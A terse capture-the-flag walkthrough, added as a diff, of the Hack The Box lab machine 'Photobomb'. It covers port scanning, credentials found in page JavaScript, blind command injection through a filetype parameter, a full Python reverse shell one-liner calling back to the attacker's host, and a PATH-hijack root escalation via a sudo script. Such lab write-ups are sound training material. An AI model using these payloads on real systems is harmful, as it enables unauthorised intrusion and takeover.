@@ -1,0 +1,54 @@
+nmap -A 10.10.11.182 -oN nmap_result.txt
+
+sudo nano /etc/hosts :- Add ip and website name
+ ip photobomb.htb
+
+Two Ports OPen :- 22 / 80 
+Go in browser and paste website 
+View websource, founded custome javascript
+ 
+IN Custom javascript :- 
+ - http://pH0t0:b0Mb!@photobomb.htb/printer'
+ - this url found with http authentication credentials
+ 
+
+ 
+Setup Foxyproxy and Burpsuite :-
+ - Intercept request by click on downloading
+ - Send to repeater 
+ - Tamper filetype parameter by adding id :- jpg;id
+ - Blind-Command Injection
+ 
+ 
+Start python server :- 
+ - python -m http.server 80
+ - tun0 ip :- 10.10.14.97
+ - curl -XGET 10.10.14.97
+ - We get response server is vulnerable to command injection
+ 
+
+Create reverse shell :-
+ - nc -lvnp 1337
+ - python3 -c 'import    
+   socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.97",
+   1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+ - cd /home
+ - cd wizard
+ - cat users.txt :- FLag :- 40d9baaca547ed7b811d59414a442197
+ 
+ 
+ 
+Sudo -l :- 
+ - (root) SETENV: NOPASSWD: /opt/cleanup.sh
+ - cd /tmp
+ - rm *
+ - export TERM=xterm
+ - echo "#!/bin/bash" > find
+ - echo "bash" >> find
+ - chmod +x find
+ - sudo PATH=/tmp:$PATH /opt/cleanup.sh
+ 
+ 
+ 
+ 
+  
